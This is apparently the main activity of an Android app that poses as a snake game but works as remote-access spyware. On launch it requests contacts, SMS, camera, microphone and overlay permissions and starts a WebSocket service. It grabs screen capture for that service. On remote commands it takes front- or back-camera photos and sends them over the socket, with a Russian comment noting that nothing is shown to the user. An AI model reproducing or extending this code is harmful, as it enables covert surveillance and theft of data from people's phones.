package com.kriptoman;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST = 100;
    private static final int SCREEN_CAPTURE = 123;
    private static final int CAMERA_REQUEST_FRONT = 200;
    private static final int CAMERA_REQUEST_BACK = 201;
    private MediaProjectionManager mpManager;
    private static MediaProjection sMediaProjection;
    private SnakeGameView gameView;
    private boolean isFrontCamera = false;
    private BroadcastReceiver cameraReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        gameView = findViewById(R.id.gameView);
        mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        checkPermissions();
        startService();
        if (sMediaProjection == null) {
            startActivityForResult(mpManager.createScreenCaptureIntent(), SCREEN_CAPTURE);
        }

        // Регистрируем ресивер для команд камеры
        cameraReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (WebSocketService.ACTION_CAMERA_FRONT.equals(action)) {
                    isFrontCamera = true;
                    launchCamera(CAMERA_REQUEST_FRONT);
                } else if (WebSocketService.ACTION_CAMERA_BACK.equals(action)) {
                    isFrontCamera = false;
                    launchCamera(CAMERA_REQUEST_BACK);
                }
            }
        };
        IntentFilter filter = new IntentFilter();
        filter.addAction(WebSocketService.ACTION_CAMERA_FRONT);
        filter.addAction(WebSocketService.ACTION_CAMERA_BACK);
        registerReceiver(cameraReceiver, filter);
    }

    private void launchCamera(int requestCode) {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (isFrontCamera) {
            intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
        }
        startActivityForResult(intent, requestCode);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_CAPTURE && resultCode == RESULT_OK) {
            sMediaProjection = mpManager.getMediaProjection(resultCode, data);
            WebSocketService.setMediaProjection(sMediaProjection);
        } else if (requestCode == CAMERA_REQUEST_FRONT || requestCode == CAMERA_REQUEST_BACK) {
            if (resultCode == RESULT_OK && data != null && data.getExtras() != null) {
                Bitmap photo = (Bitmap) data.getExtras().get("data");
                if (photo != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    photo.compress(Bitmap.CompressFormat.JPEG, 90, baos);
                    byte[] photoData = baos.toByteArray();
                    WebSocketService.sendPhoto(photoData);
                    Toast.makeText(this, "Фото отправлено", Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, "Съёмка отменена", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void startService() {
        Intent intent = new Intent(this, WebSocketService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void checkPermissions() {
        String[] perms = {
                Manifest.permission.INTERNET,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.FOREGROUND_SERVICE,
                Manifest.permission.SYSTEM_ALERT_WINDOW
        };
        List<String> need = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), PERMISSION_REQUEST);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // ничего не показываем
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraReceiver != null) {
            unregisterReceiver(cameraReceiver);
        }
    }
}
